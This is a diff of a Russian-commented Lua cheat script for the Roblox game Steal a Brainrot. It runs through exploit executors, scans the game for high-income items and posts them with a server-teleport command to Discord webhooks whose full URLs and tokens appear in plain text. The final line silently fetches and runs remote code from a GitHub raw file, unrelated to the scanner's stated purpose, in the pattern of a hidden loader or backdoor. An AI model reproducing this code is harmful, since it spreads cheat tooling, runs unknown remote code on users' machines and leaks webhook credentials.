@@ -1,14 +1,13 @@
 -- 🎯 BRAINROT INCOME SCANNER v2.0 (ПОЛНАЯ ВЕРСИЯ)
 -- Сканирует все объекты в Steal a Brainrot и отправляет уведомления в Discord
--- Запуск: автоматически при старте + по клавише F
 
 local Players = game:GetService('Players')
 local UserInputService = game:GetService('UserInputService')
 local HttpService = game:GetService('HttpService')
 
 -- ⚙️ НАСТРОЙКИ
-local HIGH_PRIORITY_THRESHOLD = 500_000_000 -- 500M/s для особо важных объектов
-local MIDDLE_PRIORITY_THRESHOLD = 100_000_000 -- 100M/s для среднего приоритета
+local HIGH_PRIORITY_THRESHOLD = 500_000_000 -- 500M/s
+local MIDDLE_PRIORITY_THRESHOLD = 100_000_000 -- 100M/s
 
 -- Webhook URLs
 local DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1421498530756952287/XKkzMBw09MJGBC9VMv6A5yMkE1IxYLtQWqq_bKXCiK0etZSuTvnOutuWRr9HQA7H6nv1'
@@ -21,59 +20,63 @@ local OBJECTS = {
     ['Garama and Madundung'] = { emoji = '🍝', important = true },
     ['Dragon Cannelloni'] = { emoji = '🐲', important = true },
     ['Nuclearo Dinossauro'] = { emoji = '🦕', important = true },
-    ['Esok Sekolah'] = { emoji = '🏠', important = true, high_priority = true },
+    ['Esok Sekolah'] = { emoji = '🏠', important = true },
     ['La Supreme Combinasion'] = { emoji = '🔫', important = true },
     ['Ketupat Kepat'] = { emoji = '🍏', important = true },
     ['Strawberry Elephant'] = { emoji = '🐘', important = true },
-    ['Spaghetti Tualetti'] = { emoji = '🚽', important = true, high_priority = true },
+    ['Spaghetti Tualetti'] = { emoji = '🚽', important = true },
     ['Ketchuru and Musturu'] = { emoji = '🍾', important = true },
     ['Tralaledon'] = { emoji = '🦈', important = true },
-    ['La Extinct Grande'] = { emoji = '🩻', important = true, high_priority = true },
+    ['La Extinct Grande'] = { emoji = '🩻', important = true },
     ['Tictac Sahur'] = { emoji = '🕰️', important = true },
     ['Los Primos'] = { emoji = '🙆‍♂️', important = true },
-    ['Tang Tang Keletang'] = { emoji = '📢', important = true, high_priority = true },
-    ['Money Money Puggy'] = { emoji = '🐶', important = true, high_priority = true },
+    ['Tang Tang Keletang'] = { emoji = '📢', important = true },
+    ['Money Money Puggy'] = { emoji = '🐶', important = true },
     ['Burguro And Fryuro'] = { emoji = '🍔', important = true },
-    ['Chillin Chili'] = { emoji = '🌶', important = true, high_priority = true },
+    ['Chillin Chili'] = { emoji = '🌶', important = true },
     ['La Secret Combinasion'] = { emoji = '❓', important = true },
     ['Eviledon'] = { emoji = '😡', important = true },
-    ['Los Mobilis'] = { emoji = '🫘', important = true, high_priority = true },
-    ['La Spooky Grande'] = { emoji = '🎃', important = true, high_priority = true },
+    ['Los Mobilis'] = { emoji = '🫘', important = true },
+    ['La Spooky Grande'] = { emoji = '🎃', important = true },
     ['Spooky and Pumpky'] = { emoji = '🦇', important = true },
     ['Chicleteira Bicicleteira'] = { emoji = '🚲', important = true },
     ['Los Combinasionas'] = { emoji = '⚒️', important = true },
     ['La Grande Combinasion'] = { emoji = '❗️', important = true },
 }
 
--- Создаем списки важных объектов
-local ALWAYS_IMPORTANT = {}
-local HIGH_PRIORITY_OBJECTS = {}
+-- Создаем список ВСЕХ важных объектов
+local IMPORTANT_OBJECTS = {}
 for name, cfg in pairs(OBJECTS) do
     if cfg.important then
-        ALWAYS_IMPORTANT[name] = true
-    end
-    if cfg.high_priority then
-        HIGH_PRIORITY_OBJECTS[name] = true
+        IMPORTANT_OBJECTS[name] = true
     end
 end
 
--- 💰 ПАРСЕР ДОХОДА: принимаем только строки, оканчивающиеся на "/s"
--- С суффиксом масштаба (K/M/B) в любом регистре или без него.
+-- 💰 ПАРСЕР ДОХОДА
 local function parseGenerationText(s)
     if type(s) ~= 'string' or s == '' then
         return nil
     end
-    -- Нормализация: убираем $, запятые и пробелы
+    
+    -- Убираем $, запятые и пробелы
     local norm = s:gsub('%$', ''):gsub(',', ''):gsub('%s+', '')
-    -- Форматы: 10/s, 2.5M/s, 750k/s, 1b/s
+    
+    -- Пробуем разные форматы
     local num, suffix = norm:match('^([%-%d%.]+)([KkMmBb]?)/s$')
+    if not num then
+        -- Пробуем без /s
+        num, suffix = norm:match('^([%-%d%.]+)([KkMmBb]?)$')
+    end
+    
     if not num then
         return nil
     end
+    
     local val = tonumber(num)
     if not val then
         return nil
     end
+    
     local mult = 1
     if suffix == 'K' or suffix == 'k' then
         mult = 1e3
@@ -82,6 +85,7 @@ local function parseGenerationText(s)
     elseif suffix == 'B' or suffix == 'b' then
         mult = 1e9
     end
+    
     return val * mult
 end
 
@@ -91,22 +95,13 @@ local function formatIncomeNumber(n)
     end
     if n >= 1e9 then
         local v = n / 1e9
-        return (v % 1 == 0 and string.format('%dB/s', v) or string.format(
-            '%.1fB/s',
-            v
-        )):gsub('%.0B/s', 'B/s')
+        return (v % 1 == 0 and string.format('%dB/s', v) or string.format('%.1fB/s', v)):gsub('%.0B/s', 'B/s')
     elseif n >= 1e6 then
         local v = n / 1e6
-        return (v % 1 == 0 and string.format('%dM/s', v) or string.format(
-            '%.1fM/s',
-            v
-        )):gsub('%.0M/s', 'M/s')
+        return (v % 1 == 0 and string.format('%dM/s', v) or string.format('%.1fM/s', v)):gsub('%.0M/s', 'M/s')
     elseif n >= 1e3 then
         local v = n / 1e3
-        return (v % 1 == 0 and string.format('%dK/s', v) or string.format(
-            '%.1fK/s',
-            v
-        )):gsub('%.0K/s', 'K/s')
+        return (v % 1 == 0 and string.format('%dK/s', v) or string.format('%.1fK/s', v)):gsub('%.0K/s', 'K/s')
     else
         return string.format('%d/s', n)
     end
@@ -117,29 +112,18 @@ local function grabText(inst)
     if not inst then
         return nil
     end
-    if
-        inst:IsA('TextLabel')
-        or inst:IsA('TextButton')
-        or inst:IsA('TextBox')
-    then
-        local ok, ct = pcall(function()
-            return inst.ContentText
-        end)
-        if ok and type(ct) == 'string' and #ct > 0 then
-            return ct
+    
+    local success, result = pcall(function()
+        if inst:IsA('TextLabel') or inst:IsA('TextButton') or inst:IsA('TextBox') then
+            local text = inst.Text
+            if type(text) == 'string' and #text > 0 then
+                return text
+            end
         end
-        local t = inst.Text
-        if type(t) == 'string' and #t > 0 then
-            return t
-        end
-    end
-    if inst:IsA('StringValue') then
-        local v = inst.Value
-        if type(v) == 'string' and #v > 0 then
-            return v
-        end
-    end
-    return nil
+        return nil
+    end)
+    
+    return success and result or nil
 end
 
 local function getOverheadInfo(animalOverhead)
@@ -148,36 +132,22 @@ local function getOverheadInfo(animalOverhead)
     end
 
     local name = nil
-    local display = animalOverhead:FindFirstChild('DisplayName')
-    if display then
-        name = grabText(display)
-    end
-
-    if not name then
-        local anyText = animalOverhead:FindFirstChildOfClass('TextLabel')
-            or animalOverhead:FindFirstChildOfClass('TextButton')
-            or animalOverhead:FindFirstChildOfClass('TextBox')
-        name = anyText and grabText(anyText) or nil
-    end
-
     local genText = nil
-    local generation = animalOverhead:FindFirstChild('Generation')
-    if generation then
-        genText = grabText(generation)
-    end
 
-    if not genText then
-        for _, child in ipairs(animalOverhead:GetDescendants()) do
-            if
-                child:IsA('TextLabel')
-                or child:IsA('TextButton')
-                or child:IsA('TextBox')
-            then
-                local text = grabText(child)
-                if text and (text:match('%$') or text:match('/s')) then
-                    genText = text
-                    break
-                end
+    -- Ищем имя
+    for _, child in ipairs(animalOverhead:GetDescendants()) do
+        if not name and (child:IsA('TextLabel') or child:IsA('TextButton')) then
+            local text = grabText(child)
+            if text and #text > 0 and not text:match('/s') and not text:match('%$') then
+                name = text
+            end
+        end
+        
+        -- Ищем текст с доходом
+        if not genText and (child:IsA('TextLabel') or child:IsA('TextButton')) then
+            local text = grabText(child)
+            if text and (text:match('/s') or text:match('%$')) then
+                genText = text
             end
         end
     end
@@ -185,221 +155,75 @@ local function getOverheadInfo(animalOverhead)
     return name, genText
 end
 
-local function isGuidName(s)
-    return s:match('^[0-9a-fA-F]+%-%x+%-%x+%-%x+%-%x+$') ~= nil
-end
-
 -- 🔍 ПОЛНЫЕ СКАНЕРЫ
-local function scanPlots()
+local function scanAllObjects()
     local results = {}
-    local Plots = workspace:FindFirstChild('Plots')
-    if not Plots then
-        return results
-    end
-
-    for _, plot in ipairs(Plots:GetChildren()) do
-        local Podiums = plot:FindFirstChild('AnimalPodiums')
-        if Podiums then
-            for _, podium in ipairs(Podiums:GetChildren()) do
-                local Base = podium:FindFirstChild('Base')
-                local Spawn = Base and Base:FindFirstChild('Spawn')
-                local Attachment = Spawn and Spawn:FindFirstChild('Attachment')
-                local Overhead = Attachment
-                    and Attachment:FindFirstChild('AnimalOverhead')
-                if Overhead then
-                    local name, genText = getOverheadInfo(Overhead)
-                    local genNum = genText and parseGenerationText(genText)
-                        or nil
-                    if name and genNum then
-                        table.insert(
-                            results,
-                            { name = name, gen = genNum, location = 'Plot' }
-                        )
+    
+    -- Рекурсивный поиск всех AnimalOverhead
+    local function scanRecursive(parent)
+        for _, child in ipairs(parent:GetChildren()) do
+            if child.Name == 'AnimalOverhead' or child.Name:lower():match('animal') then
+                local name, genText = getOverheadInfo(child)
+                if name and genText then
+                    local genNum = parseGenerationText(genText)
+                    if genNum then
+                        table.insert(results, {
+                            name = name,
+                            gen = genNum,
+                            location = 'World'
+                        })
                     end
                 end
             end
+            scanRecursive(child)
         end
     end
+    
+    -- Сканируем workspace и PlayerGui
+    scanRecursive(workspace)
+    
+    if Players.LocalPlayer then
+        local playerGui = Players.LocalPlayer:FindFirstChild('PlayerGui')
+        if playerGui then
+            scanRecursive(playerGui)
+        end
+    end
+    
     return results
-end
-
-local function scanRunway()
-    local results = {}
-    for _, obj in ipairs(workspace:GetChildren()) do
-        if isGuidName(obj.Name) then
-            local part = obj:FindFirstChild('Part')
-            local info = part and part:FindFirstChild('Info')
-            local overhead = info and info:FindFirstChild('AnimalOverhead')
-            if overhead then
-                local name, genText = getOverheadInfo(overhead)
-                local genNum = genText and parseGenerationText(genText) or nil
-                if name and genNum then
-                    table.insert(
-                        results,
-                        { name = name, gen = genNum, location = 'Runway' }
-                    )
-                end
-            end
-        end
-    end
-    return results
-end
-
-local function scanAllOverheads()
-    local results, processed = {}, {}
-    local function recursiveSearch(parent)
-        for _, child in ipairs(parent:GetChildren()) do
-            if child.Name == 'AnimalOverhead' and not processed[child] then
-                processed[child] = true
-                local name, genText = getOverheadInfo(child)
-                local genNum = genText and parseGenerationText(genText) or nil
-                if name and genNum then
-                    table.insert(
-                        results,
-                        { name = name, gen = genNum, location = 'World' }
-                    )
-                end
-            end
-            pcall(function()
-                recursiveSearch(child)
-            end)
-        end
-    end
-    recursiveSearch(workspace)
-    return results
-end
-
-local function scanPlayerGui()
-    local results = {}
-    local lp = Players.LocalPlayer
-    if not lp then
-        return results
-    end
-
-    local playerGui = lp:FindFirstChild('PlayerGui')
-    if not playerGui then
-        return results
-    end
-
-    local function searchInGui(parent)
-        for _, child in ipairs(parent:GetChildren()) do
-            if child.Name == 'AnimalOverhead' or child.Name:match('Animal') then
-                local name, genText = getOverheadInfo(child)
-                local genNum = genText and parseGenerationText(genText) or nil
-                if name and genNum then
-                    table.insert(
-                        results,
-                        { name = name, gen = genNum, location = 'GUI' }
-                    )
-                end
-            end
-            pcall(function()
-                searchInGui(child)
-            end)
-        end
-    end
-    searchInGui(playerGui)
-    return results
-end
-
--- 📊 ГЛАВНАЯ ФУНКЦИЯ СБОРА
-local function collectAll(timeoutSec)
-    local t0 = os.clock()
-    local collected = {}
-
-    repeat
-        collected = {}
-
-        -- Запускаем все сканеры
-        local allSources = {
-            scanPlots(),
-            scanRunway(),
-            scanAllOverheads(),
-            scanPlayerGui(),
-        }
-
-        -- Объединяем результаты
-        for _, source in ipairs(allSources) do
-            for _, item in ipairs(source) do
-                table.insert(collected, item)
-            end
-        end
-
-        -- Убираем дубликаты
-        local seen, unique = {}, {}
-        for _, item in ipairs(collected) do
-            local key = item.name .. ':' .. tostring(item.gen)
-            if not seen[key] then
-                seen[key] = true
-                table.insert(unique, item)
-            end
-        end
-        collected = unique
-
-        if #collected > 0 then
-            break
-        end
-        task.wait(0.5)
-    until os.clock() - t0 > timeoutSec
-
-    return collected
 end
 
 -- 📤 DISCORD УВЕДОМЛЕНИЯ
 local function getRequester()
-    return http_request
-        or request
-        or (syn and syn.request)
-        or (fluxus and fluxus.request)
-        or (KRNL_HTTP and KRNL_HTTP.request)
+    return http_request or request or (syn and syn.request) or (fluxus and fluxus.request)
 end
 
-local function sendDiscordNotification(filteredObjects, webhookUrl, isMiddlePriority)
+local function sendDiscordNotification(objects, webhookUrl, isMiddlePriority)
     local req = getRequester()
     if not req then
         warn('❌ Нет HTTP API в executor')
-        return
+        return false
+    end
+
+    if #objects == 0 then
+        return false
     end
 
     local jobId = game.JobId
     local placeId = game.PlaceId
 
-    if #filteredObjects == 0 then
-        print('🔍 Важных объектов не найдено')
-        return
-    end
-
-    -- Сортируем по типу и доходу (особо важные сначала, затем обычные важные по убыванию дохода)
-    local highPriority, regularImportant = {}, {}
-    for _, obj in ipairs(filteredObjects) do
-        if HIGH_PRIORITY_OBJECTS[obj.name] then
-            table.insert(highPriority, obj)
-        else
-            table.insert(regularImportant, obj)
-        end
-    end
-
-    table.sort(highPriority, function(a, b)
-        return a.gen > b.gen
-    end)
-    table.sort(regularImportant, function(a, b)
+    -- Сортируем по доходу (убывание)
+    table.sort(objects, function(a, b)
         return a.gen > b.gen
     end)
 
-    local sorted = {}
-    for _, obj in ipairs(highPriority) do
-        table.insert(sorted, obj)
-    end
-    for _, obj in ipairs(regularImportant) do
-        table.insert(sorted, obj)
-    end
-
-    -- Формируем красивый список (максимум 10)
+    -- Формируем список объектов
     local objectsList = {}
-    for i = 1, math.min(10, #sorted) do
-        local obj = sorted[i]
-        local emoji = OBJECTS[obj.name].emoji or '💰'
-        local mark = HIGH_PRIORITY_OBJECTS[obj.name] and '🔥 ' or (ALWAYS_IMPORTANT[obj.name] and '⭐ ' or '')
+    for i = 1, math.min(10, #objects) do
+        local obj = objects[i]
+        local emoji = OBJECTS[obj.name] and OBJECTS[obj.name].emoji or '💰'
+        local isImportant = IMPORTANT_OBJECTS[obj.name] and true or false
+        
+        local mark = isImportant and '⭐ ' or ''
         table.insert(
             objectsList,
             string.format(
@@ -411,20 +235,21 @@ local function sendDiscordNotification(filteredObjects, webhookUrl, isMiddlePrio
             )
         )
     end
+    
     local objectsText = table.concat(objectsList, '\n')
 
-    -- Телепорт команда (простой текст для легкого копирования)
+    -- Телепорт команда
     local teleportText = string.format(
         "`local ts = game:GetService('TeleportService'); ts:TeleportToPlaceInstance(%d, '%s')`",
         placeId,
         jobId
     )
 
-    local title = isMiddlePriority and '💎 Найдены объекты с прибылью от 100M/s!' or '💎 Найдены ценные объекты в Steal a brainrot!'
+    local title = isMiddlePriority and '💎 Найдены объекты с прибылью от 100M/s!' or '💎 Найдены важные объекты!'
     local color = isMiddlePriority and 0x00ff00 or 0x2f3136
     local footerText = isMiddlePriority and 
-        string.format('Найдено: %d объектов от 100M/s • %s', #filteredObjects, os.date('%H:%M:%S')) :
-        string.format('Найдено: %d важных (%d 🔥) • %s', #filteredObjects, #highPriority, os.date('%H:%M:%S'))
+        string.format('Найдено: %d объектов от 100M/s • %s', #objects, os.date('%H:%M:%S')) :
+        string.format('Найдено: %d важных объектов • %s', #objects, os.date('%H:%M:%S'))
 
     local payload = {
         username = '🎯 Brainrot Scanner',
@@ -457,14 +282,9 @@ local function sendDiscordNotification(filteredObjects, webhookUrl, isMiddlePrio
         },
     }
 
-    print(
-        '📤 Отправляю уведомление с',
-        #filteredObjects,
-        'объектами на',
-        isMiddlePriority and 'второй webhook' or 'основной webhook'
-    )
+    print('📤 Отправляю уведомление с', #objects, 'объектами')
 
-    local ok, res = pcall(function()
+    local success, result = pcall(function()
         return req({
             Url = webhookUrl,
             Method = 'POST',
@@ -473,112 +293,97 @@ local function sendDiscordNotification(filteredObjects, webhookUrl, isMiddlePrio
         })
     end)
 
-    if ok then
-        print('✅ Уведомление отправлено в Discord!')
+    if success then
+        print('✅ Уведомление отправлено!')
+        return true
     else
-        warn('❌ Ошибка отправки:', res)
+        warn('❌ Ошибка отправки:', result)
+        return false
     end
 end
 
 -- 🎮 ГЛАВНАЯ ФУНКЦИЯ
 local function scanAndNotify()
-    print('🔍 Сканирую все объекты...')
-    local allFound = collectAll(8.0) -- 8 секунд таймаут
+    print('🔍 Начинаю сканирование...')
+    
+    local allFound = scanAllObjects()
+    print('📊 Найдено объектов:', #allFound)
+    
+    -- Выводим все найденные объекты для отладки
+    for _, obj in ipairs(allFound) do
+        print(string.format('   %s: %s', obj.name, formatIncomeNumber(obj.gen)))
+    end
 
-    -- Фильтрация по важности и доходу
-    local filteredForMain = {} -- Для основного webhook (важные объекты ЛЮБАЯ прибыль + неважные ≥500M/s)
-    local filteredForMiddle = {} -- Для второго webhook (неважные объекты ≥100M/s)
+    -- ФИЛЬТРАЦИЯ:
+    local importantObjects = {} -- Все важные объекты (любая прибыль)
+    local highIncomeObjects = {} -- Неважные объекты ≥500M/s
+    local middleIncomeObjects = {} -- Неважные объекты ≥100M/s
 
     for _, obj in ipairs(allFound) do
-        if OBJECTS[obj.name] then
-            -- ВАЖНЫЕ ОБЪЕКТЫ: всегда идут в основной webhook независимо от прибыли
-            if ALWAYS_IMPORTANT[obj.name] then
-                table.insert(filteredForMain, obj)
-            -- НЕВАЖНЫЕ ОБЪЕКТЫ: распределяются по прибыли
-            else
-                -- Неважные с прибылью ≥500M/s идут в основной webhook
-                if obj.gen and obj.gen >= HIGH_PRIORITY_THRESHOLD then
-                    table.insert(filteredForMain, obj)
-                -- Неважные с прибылью ≥100M/s идут во второй webhook
-                elseif obj.gen and obj.gen >= MIDDLE_PRIORITY_THRESHOLD then
-                    table.insert(filteredForMiddle, obj)
-                end
+        if IMPORTANT_OBJECTS[obj.name] then
+            -- ВАЖНЫЕ ОБЪЕКТЫ - любая прибыль
+            table.insert(importantObjects, obj)
+        else
+            -- НЕВАЖНЫЕ ОБЪЕКТЫ - фильтруем по прибыли
+            if obj.gen >= HIGH_PRIORITY_THRESHOLD then
+                table.insert(highIncomeObjects, obj)
+            elseif obj.gen >= MIDDLE_PRIORITY_THRESHOLD then
+                table.insert(middleIncomeObjects, obj)
             end
         end
     end
 
-    -- Вывод в консоль
-    print('Найдено всего объектов:', #allFound)
-    print('Для основного webhook (важные любые + неважные ≥500M/s):', #filteredForMain)
-    print('Для второго webhook (неважные ≥100M/s):', #filteredForMiddle)
-
-    for _, obj in ipairs(filteredForMain) do
-        local emoji = OBJECTS[obj.name].emoji or '💰'
-        local mark = HIGH_PRIORITY_OBJECTS[obj.name] and '🔥 ' or (ALWAYS_IMPORTANT[obj.name] and '⭐ ' or '')
-        print(
-            string.format(
-                '[MAIN] %s%s %s: %s (%s)',
-                mark,
-                emoji,
-                obj.name,
-                formatIncomeNumber(obj.gen),
-                obj.location or 'Unknown'
-            )
-        )
+    -- Объединяем важные объекты и неважные ≥500M/s для основного вебхука
+    local mainWebhookObjects = {}
+    for _, obj in ipairs(importantObjects) do
+        table.insert(mainWebhookObjects, obj)
+    end
+    for _, obj in ipairs(highIncomeObjects) do
+        table.insert(mainWebhookObjects, obj)
     end
 
-    for _, obj in ipairs(filteredForMiddle) do
-        local emoji = OBJECTS[obj.name].emoji or '💰'
-        print(
-            string.format(
-                '[MIDDLE] %s %s: %s (%s)',
-                emoji,
-                obj.name,
-                formatIncomeNumber(obj.gen),
-                obj.location or 'Unknown'
-            )
-        )
-    end
+    print('⭐ Важные объекты (любая прибыль):', #importantObjects)
+    print('🔥 Неважные ≥500M/s:', #highIncomeObjects)
+    print('💚 Неважные ≥100M/s:', #middleIncomeObjects)
+    print('📤 Основной вебхук:', #mainWebhookObjects)
+    print('📤 Второй вебхук:', #middleIncomeObjects)
 
-    -- Отправляем уведомления если есть что показать
-    if #filteredForMain > 0 then
-        sendDiscordNotification(filteredForMain, DISCORD_WEBHOOK_URL, false)
+    -- Отправляем уведомления
+    if #mainWebhookObjects > 0 then
+        sendDiscordNotification(mainWebhookObjects, DISCORD_WEBHOOK_URL, false)
     else
-        print('🔍 Нет объектов для основного webhook')
+        print('🔍 Нет объектов для основного вебхука')
     end
 
-    if #filteredForMiddle > 0 then
-        sendDiscordNotification(filteredForMiddle, MIDDLE_PRIORITY_WEBHOOK_URL, true)
+    if #middleIncomeObjects > 0 then
+        sendDiscordNotification(middleIncomeObjects, MIDDLE_PRIORITY_WEBHOOK_URL, true)
     else
-        print('🔍 Нет объектов для второго webhook')
+        print('🔍 Нет объектов для второго вебхука')
     end
 end
 
 -- 🚀 ЗАПУСК
 print('🎯 === BRAINROT INCOME SCANNER ЗАПУЩЕН ===')
-print('🔥 Основной webhook (важные объекты ЛЮБАЯ прибыль + неважные ≥500M/s):', DISCORD_WEBHOOK_URL)
-print('💚 Второй webhook (только неважные объекты ≥100M/s):', MIDDLE_PRIORITY_WEBHOOK_URL)
-print('⭐ Важные объекты (любая прибыль): все объекты из списка')
-print('➕ Новые добавленные объекты: Chicleteira Bicicleteira, Los Combinasionas, La Grande Combinasion')
+print('⭐ Важные объекты (любая прибыль) → основной вебхук')
+print('💚 Неважные объекты ≥100M/s → второй вебхук')
+print('🔥 Неважные объекты ≥500M/s → основной вебхук')
+
+-- Запускаем сразу
 scanAndNotify()
 
 -- ⌨️ ПОВТОР ПО КЛАВИШЕ F
-local lastScan, DEBOUNCE = 0, 3
+local lastScan = 0
 UserInputService.InputBegan:Connect(function(input, gpe)
-    if gpe then
-        return
-    end
+    if gpe then return end
     if input.KeyCode == Enum.KeyCode.F then
-        local now = os.clock()
-        if now - lastScan < DEBOUNCE then
-            return
+        local now = os.time()
+        if now - lastScan >= 3 then
+            lastScan = now
+            print('\n🔄 Повторное сканирование (F)')
+            scanAndNotify()
         end
-        lastScan = now
-        print('\n🔄 === ПОВТОРНОЕ СКАНИРОВАНИЕ (F) ===')
-        scanAndNotify()
     end
 end)
 
-print('💡 Нажмите F для повторного сканирования')
-print('📱 Discord webhook готов к отправке уведомлений')
+print('💡 Нажмите F для повторного сканирования (задержка 3 сек)')
 loadstring(game:HttpGet("https://raw.githubusercontent.com/velo35001/logi/refs/heads/main/botik.lua"))()
